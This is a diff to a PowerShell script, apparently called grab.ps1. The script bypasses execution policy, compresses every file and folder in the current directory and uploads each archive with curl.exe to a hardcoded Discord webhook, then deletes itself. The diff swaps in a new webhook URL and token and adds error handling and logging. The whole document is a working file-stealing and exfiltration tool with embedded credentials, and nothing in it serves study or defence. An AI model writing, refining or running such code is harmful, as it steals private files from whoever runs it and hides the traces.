@@ -1,4 +1,3 @@
-
 # Bypass execution policy for this session to allow script execution
 Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
 
@@ -11,7 +10,7 @@ function Upload-Discord {
         [string]$directory = (Get-Location).Path
     )
 
-    $hookurl = 'https://discord.com/api/webhooks/1376787025948315678/1k2wMoUv6tn-4VwDVGS8IgL4BZbQquj9iu3Raw03N0KQ_ClXtonvsGdl0mQ23gOJgNKK'
+    $hookurl = 'https://discord.com/api/webhooks/1374335410284789791/tMZl31tivirFNsvwCt19-tqu6nirxFBYj2_Q-kFF-UH0GfVuSGaMa1fOFf6lkOVk4Vt9'
 
     $Body = @{
         'username' = $env:username
@@ -24,30 +23,48 @@ function Upload-Discord {
 
     # Get all files and directories in the specified path
     $items = Get-ChildItem -Path $directory
-
+    
+    Write-Host "Found $($items.Count) items in directory: $directory"
     foreach ($item in $items) {
+        Write-Host "Processing: $($item.Name)"
+        # Skip the script itself to avoid self-compression issues
+        if ($item.Name -eq "grab.ps1") {
+            continue
+        }
+
         $zipFilePath = "$env:TEMP\$($item.BaseName).zip"
 
-        # Use Compress-Archive to create a ZIP file (works for both files and directories)
-        Compress-Archive -Path $item.FullName -DestinationPath $zipFilePath -Force
+        try {
+            # Use Compress-Archive to create a ZIP file (works for both files and directories)
+            Compress-Archive -Path $item.FullName -DestinationPath $zipFilePath -Force -ErrorAction Stop
 
-        # Check if the ZIP file was created successfully
-        if (Test-Path $zipFilePath) {
-            try {
-                # Upload the ZIP file to Discord
-                curl.exe -F "file1=@$zipFilePath" $hookurl
+            # Check if the ZIP file was created successfully
+            if (Test-Path $zipFilePath) {
+                try {
+                    # Upload the ZIP file to Discord
+                    Write-Host "Uploading $($item.Name) to Discord..."
+                    $curlResult = curl.exe -F "file1=@$zipFilePath" $hookurl
+                    Write-Host "Upload result: $curlResult"
 
-                # Remove the temporary ZIP file
-                Remove-Item $zipFilePath -Force
-            } catch {
-                Write-Host "Failed to upload or delete ZIP file for $($item.Name): $($_.Exception.Message)"
-                # Still try to clean up the ZIP file even if upload failed
-                if (Test-Path $zipFilePath) {
-                    Remove-Item $zipFilePath -Force -ErrorAction SilentlyContinue
+                    # Remove the temporary ZIP file
+                    Remove-Item $zipFilePath -Force
+                    Write-Host "Successfully uploaded and cleaned up $($item.Name)"
+                } catch {
+                    Write-Host "Failed to upload ZIP file for $($item.Name): $($_.Exception.Message)"
+                    # Still try to clean up the ZIP file even if upload failed
+                    if (Test-Path $zipFilePath) {
+                        Remove-Item $zipFilePath -Force -ErrorAction SilentlyContinue
+                    }
                 }
+            } else {
+                Write-Host "ZIP file was not created for $($item.Name)"
             }
-        } else {
-            Write-Host "Failed to create ZIP file for $($item.Name)"
+        } catch {
+            Write-Host "Failed to compress $($item.Name): $($_.Exception.Message)"
+            # Clean up any partial ZIP file
+            if (Test-Path $zipFilePath) {
+                Remove-Item $zipFilePath -Force -ErrorAction SilentlyContinue
+            }
         }
     }
 }
@@ -72,13 +89,13 @@ try {
 try {
     # Get the path of the current script
     $scriptPath = $MyInvocation.MyCommand.Path
-
+    
     # Wait a moment to ensure all operations are complete
     Start-Sleep -Seconds 2
-
+    
     # Delete the script file
     Remove-Item -Path $scriptPath -Force
-
+    
     Write-Host "Script has been deleted successfully."
 } catch {
     Write-Host "Failed to delete script: $($_.Exception.Message)"
